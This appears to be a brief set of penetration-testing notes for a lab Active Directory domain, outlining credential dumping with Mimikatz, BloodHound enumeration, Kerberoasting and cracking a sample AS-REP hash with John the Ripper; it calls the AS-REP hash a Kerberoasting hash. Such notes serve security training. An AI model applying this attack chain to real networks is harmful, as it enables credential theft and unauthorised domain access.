# 1.) Get user details (Mimikatz)
Oncec you have a priviledge account, using GodPotato or something, you can find user details using Mimikatz
Check out "Tool Usage > Mimikatz" of usage

# 2.) Enumerate DC's using user Details
Once you have the username and password or password hash, you can enumerate ther DC's for user details using bloodhound
Check out "Tool usage > Bloodhound"

# 3.) Kerberoasting
Check out "Tool Usage > Keberoasing > Custom Scripts"

# 4.) Cracking the HASH.
Save the Kerberoasting hash to a file (e.g.: as-rep-hash) and use John  to crack it:

as-rep-hash example:
```
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:45d88fa5173a6b21c4df0bd60e381b6f$92847c1ba3a0d151f917293acad5c3aaf2747832a4c2c7dabd8677477adfab12a17f1d44ef87f018a351296e20a7dde3745c537f4d8e35a794fe4ca9d4cb9a40f93c31cda41536e35b3bd212bc689ad6cdf110d2558d00ebd1e48dde11def1f86863194f00c03dfe5dc574f1575de7bd62d6030190d4c2111d161c044f2e9de5e2c3ecd48792a1b687c0fb0f52c32e623d1cdbbaf8748c8078ef5586c6b474458d38bd12ea92175f0d14f6e9dbf8b2610eb02df9f0c792fe400844b95782f8fe742f699ec4ccd620ec821a11dee2a93b93e4f3ff66adf2e4fc428608e74eb060d3878ed1e74d97b4e347efa63acc5e22a5abfc704c344d4c3ef97ffeab44b614c123bd38b344
```

Cracking:
```bash 
john as-rep-hash --wordlist=/usr/share/wordlists/rockyou.txt
```

